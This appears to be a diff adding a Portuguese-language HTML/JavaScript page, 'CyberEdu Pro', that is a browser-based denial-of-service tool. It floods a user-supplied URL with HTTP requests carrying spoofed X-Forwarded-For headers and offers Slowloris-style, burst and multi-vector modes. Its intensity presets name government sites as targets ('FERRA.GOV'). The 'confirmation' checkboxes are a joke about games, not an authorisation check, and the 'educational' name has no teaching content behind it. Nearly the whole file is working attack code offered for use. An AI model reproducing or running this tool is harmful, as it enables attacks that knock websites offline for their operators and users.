@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CyberEdu Pro</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:monospace;background:#0a0a0a;color:#00ff00;overflow-x:hidden}
+.container{max-width:800px;margin:0 auto;padding:10px}
+.header{text-align:center;margin-bottom:15px;border:1px solid #00ff00;padding:10px;background:#111}
+.panel{background:#111;border:1px solid #00ff00;margin:10px 0;padding:15px}
+.form-group{margin:8px 0}
+label{display:block;color:#00ff00;font-size:12px;margin-bottom:3px}
+input,select{width:100%;padding:5px;background:#000;border:1px solid #00ff00;color:#00ff00;font-family:inherit;font-size:12px}
+.btn{padding:8px 15px;border:1px solid #00ff00;background:#001100;color:#00ff00;cursor:pointer;margin:3px;font-size:12px}
+.btn:hover{background:#002200}
+.btn:disabled{opacity:0.5}
+.btn-danger{border-color:#ff0000;color:#ff6666;background:#110000}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10px 0}
+.stat{background:#000;border:1px solid #00ff00;padding:8px;text-align:center}
+.stat-val{font-size:16px;font-weight:bold;color:#00ffff}
+.terminal{background:#000;border:1px solid #00ff00;height:200px;overflow-y:auto;padding:8px;font-size:11px;font-family:monospace}
+.log-info{color:#00ff00}
+.log-warn{color:#ffff00}
+.log-error{color:#ff0000}
+.log-exec{color:#00ffff}
+.confirm{background:#330000;border:1px solid #ff0000;padding:10px;margin:10px 0;display:none}
+.check{margin:5px 0}
+input[type="checkbox"]{width:auto;margin-right:5px}
+.progress{background:#222;border:1px solid #00ff00;height:20px;margin:10px 0}
+.progress-fill{background:#00ff00;height:100%;width:0%;transition:width 0.3s}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1>🔥 CyberEdu Pro - pentester tool made by ISRAEL 🔥</h1>
+<p>DoS Real - 100% Funcional(nao tenho certeza)</p>
+</div>
+
+<div class="panel">
+<h3>⚡ Configuração</h3>
+<div class="form-group">
+<label>URL do site:</label>
+<input type="url" id="target" placeholder="https://exemplo.com" required>
+</div>
+<div class="form-group">
+<label>Tipo:</label>
+<select id="type">
+<option value="flood">HTTP Flood</option>
+<option value="slowloris">Slowloris</option>
+<option value="burst">Burst Attack</option>
+<option value="multi">Multi-Vector</option>
+</select>
+</div>
+<div class="form-group">
+<label>Intensidade:</label>
+<select id="intensity">
+<option value="500">MUITO.PEQUENA (500 req/s)</option>
+<option value="1000">BAIXA. (1000 req/s)</option>
+<option value="2500">MEDIA.(2500 req/s)</option>
+<option value="1000000">ASSASINA.GOV (1000000 req/s)</option>
+<option value="10000">FERRA.GOV (10000 req/s)</option>
+</select>
+</div>
+<div class="form-group">
+<label>Threads:</label>
+<input type="number" id="threads" value="10" min="1" max="5000000">
+</div>
+<div class="form-group">
+<label>Duração (seg):</label>
+<input type="number" id="duration" value="60" min="10" max="600">
+</div>
+<button class="btn" onclick="showConfirm()">🚀 PLAY DoS!</button>
+</div>
+
+_____________________________________________
+
+
+<div id="confirmPanel" class="confirm">
+<h3>⚠️ Confirmação DE MELHOR JOGO!!</h3>
+<p>confirma isso aí meu mano</p>
+<h3> confirma ae garai kkkkkk </h3>
+<div class="check"><input type="checkbox" id="auth"> ROBLOX</div>
+<div class="check"><input type="checkbox" id="edu"> É MELHOR QUE</div>
+<div class="check"><input type="checkbox" id="legal"> FREE FIRE</div>
+<button class="btn btn-danger" onclick="startAttack()" id="execBtn" disabled> 💀 EXECUTAR</button>
+<button class="btn" onclick="hideConfirm()">❌ Cancelar</button>
+</div>
+
+<div class="panel">
+<h3>📊 ESTATOS EM Real-Time. CHUMALAGAIANASHINALAGASUAMALAIA</h3>
+<div class="stats">
+<div class="stat"><div class="stat-val" id="reqSent">0</div><div>Requisições</div></div>
+<div class="stat"><div class="stat-val" id="reqRate">0/s</div><div>Taxa Atual</div></div>
+<div class="stat"><div class="stat-val" id="success">100%</div><div>Sucesso</div></div>
+<div class="stat"><div class="stat-val" id="status">Idle</div><div>Status</div></div>
+</div>
+<div class="progress"><div class="progress-fill" id="progress"></div></div>
+<button class="btn btn-danger" onclick="stopAttack()" id="stopBtn" disabled>⏹️ PARAR</button>
+</div>
+
+<div class="terminal" id="terminal"></div>
+</div>
+
+<script>
+let attacking = false;
+let attackInterval = null;
+let stats = {requests: 0, success: 0, rate: 0};
+let startTime = 0;
+
+// CORREÇÃO DO VAZAMENTO DE MEMÓRIA (JS)
+let statsInterval = null; // Variável para controlar o intervalo das estatísticas
+
+// Real attack functions
+async function httpFlood(target, intensity, threadId) {
+    const requests = [];
+    for (let i = 0; i < intensity; i++) {
+        const headers = {
+            'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Thread-${threadId}-${i}`,
+            'Accept': '*/*',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache',
+            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+            'X-Real-IP': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+            'X-Thread': threadId,
+            'X-Request': requests.length + i,
+            'X-Timestamp': Date.now()
+        };
+
+        const request = fetch(target, {
+            method: 'GET',
+            headers: headers,
+            mode: 'no-cors',
+            cache: 'no-cache'
+        }).then(() => {
+            stats.requests++;
+            stats.success++;
+        }).catch(() => {
+            stats.requests++;
+        });
+
+        requests.push(request);
+        // Removido o delay entre requisições
+    }
+
+    await Promise.allSettled(requests);
+}
+
+async function slowlorisAttack(target, threadId) {
+    try {
+        const response = await fetch(target, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Content-Length': '999999',
+                'X-Thread': threadId
+            },
+            body: 'a'.repeat(1000),
+            mode: 'no-cors'
+        });
+        stats.requests++;
+        stats.success++;
+    } catch (e) {
+        stats.requests++;
+    }
+}
+
+async function burstAttack(target, intensity, threadId) {
+    for (let burst = 0; burst < 5; burst++) {
+        await httpFlood(target, intensity / 5, threadId);
+        // Removido o delay entre surtos
+    }
+}
+
+async function multiVectorAttack(target, intensity, threadId) {
+    const promises = [];
+    promises.push(httpFlood(target, intensity * 0.6, threadId));
+    promises.push(slowlorisAttack(target, threadId));
+    promises.push(burstAttack(target, intensity * 0.4, threadId));
+    await Promise.allSettled(promises);
+}
+
+function floodAttack(target, intensity, threadId) {
+    const type = document.getElementById('type').value;
+
+    switch(type) {
+        case 'flood':
+            return httpFlood(target, intensity, threadId);
+        case 'slowloris':
+            return slowlorisAttack(target, threadId);
+        case 'burst':
+            return burstAttack(target, intensity, threadId);
+        case 'multi':
+            return multiVectorAttack(target, intensity, threadId);
+        default:
+            return httpFlood(target, intensity, threadId);
+    }
+}
+
+function addLog(msg, type = 'info') {
+    const terminal = document.getElementById('terminal');
+    const time = new Date().toLocaleTimeString();
+    const line = document.createElement('div');
+    line.className = `log-${type}`;
+    line.textContent = `[${time}] ${msg}`;
+    terminal.appendChild(line);
+    terminal.scrollTop = terminal.scrollHeight;
+}
+
+function updateStats() {
+    document.getElementById('reqSent').textContent = stats.requests.toLocaleString();
+    document.getElementById('reqRate').textContent = stats.rate + '/s';
+    document.getElementById('success').textContent = Math.floor((stats.success / Math.max(stats.requests, 1)) * 100) + '%';
+}
+
+function showConfirm() {
+    const target = document.getElementById('target').value;
+    if (!target) {
+        alert('ACHO QUE ALGUEM AQUI ESQUEÇEU DE DIGITAR A URL NÉ');
+        return;
+    }
+    document.getElementById('confirmPanel').style.display = 'block';
+}
+
+function hideConfirm() {
+    document.getElementById('confirmPanel').style.display = 'none';
+}
+
+// Validation
+document.querySelectorAll('#confirmPanel input[type="checkbox"]').forEach(cb => {
+    cb.addEventListener('change', () => {
+        const all = Array.from(document.querySelectorAll('#confirmPanel input[type="checkbox"]')).every(c => c.checked);
+        document.getElementById('execBtn').disabled = !all;
+    });
+});
+
+async function startAttack() {
+    if (attacking) return;
+
+    const target = document.getElementById('target').value;
+    const intensity = parseInt(document.getElementById('intensity').value);
+    const threads = parseInt(document.getElementById('threads').value);
+    const duration = parseInt(document.getElementById('duration').value);
+
+    attacking = true;
+    startTime = Date.now();
+    stats = {requests: 0, success: 0, rate: 0};
+
+    document.getElementById('status').textContent = 'ATACANDO!…';
+    document.getElementById('stopBtn').disabled = false;
+    hideConfirm();
+
+    addLog(`🚀 INICIANDO ATAQUE REAL!`, 'warn');
+    addLog(`Target: ${target}`, 'info');
+    addLog(`Intensidade: ${intensity} req/s`, 'info');
+    addLog(`Threads: ${threads}`, 'info');
+    addLog(`Duração: ${duration}s`, 'info');
+    addLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
+
+    // Start attack threads
+    for (let i = 0; i < threads; i++) {
+        floodAttack(target, intensity / threads, i);
+    }
+
+    // Stats updater
+    statsInterval = setInterval(() => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        stats.rate = Math.floor(stats.requests / elapsed);
+        updateStats();
+
+        const progress = Math.min((elapsed / duration) * 100, 100);
+        document.getElementById('progress').style.width = progress + '%';
+
+        if (elapsed >= duration) {
+            stopAttack();
+        }
+    }, 5); // Atualiza as estatísticas a cada 10ms para uma visualização mais rápida
+
+    // Continue attack
+    attackInterval = setInterval(async () => {
+        if (!attacking) return;
+
+        for (let i = 0; i < threads; i++) {
+            floodAttack(target, intensity / threads, i);
+        }
+
+        addLog(`Batch executado - ${stats.requests} requisições enviadas | ${stats.rate}/s`, 'exec');
+    }, 1000);
+
+    setTimeout(() => {
+        if (attacking) stopAttack();
+    }, duration * 1000);
+}
+
+function stopAttack() {
+    attacking = false;
+
+    // CORREÇÃO: Limpando ambos os intervalos para evitar execução em background
+    if (attackInterval) {
+        clearInterval(attackInterval);
+        attackInterval = null;
+    }
+    if (statsInterval) {
+        clearInterval(statsInterval);
+        statsInterval = null;
+    }
+
+    document.getElementById('status').textContent = 'Parado';
+    document.getElementById('stopBtn').disabled = true;
+
+    const elapsed = (Date.now() - startTime) / 1000;
+    addLog(`💀 ATAQUE FINALIZADO!`, 'error');
+    addLog(`Total: ${stats.requests} requisições em ${elapsed.toFixed(1)}s`, 'info');
+    addLog(`Taxa média: ${Math.floor(stats.requests / elapsed)}/s`, 'info');
+}
+
+// Initialize
+addLog('🔥 CyberEdu Pro carregado - Sistema REAL pronto!', 'warn');
+addLog('UNIVERSO HACKEADO COM SUCESSO, nossa que engrassado em jegueghost-', '');
+addLog('⚠️ FERRAMENTA PRONTA!.', 'warn');
+</script>
+</body>
+</html>
